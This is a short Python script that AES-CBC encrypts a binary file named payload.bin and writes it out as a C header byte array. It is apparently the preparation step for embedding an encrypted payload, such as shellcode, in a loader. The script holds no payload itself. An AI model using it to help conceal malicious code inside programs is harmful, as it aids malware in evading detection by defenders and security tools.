# Save as make_payload.py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

KEY = bytes([
# your key here
])
IV = bytes([
# your key here
])

with open("payload.bin", "rb") as f:
    data = f.read()

cipher = AES.new(KEY, AES.MODE_CBC, IV)
enc = cipher.encrypt(pad(data, AES.block_size))

with open("payload.h", "w") as f:
    f.write("unsigned char encryptedPayload[] = {\n")
    for i, b in enumerate(enc):
        f.write(f"0x{b:02x},")
        if (i + 1) % 16 == 0:
            f.write("\n")
    f.write("};\n")
    f.write(f"unsigned int encryptedPayloadLen = {len(enc)};\n")
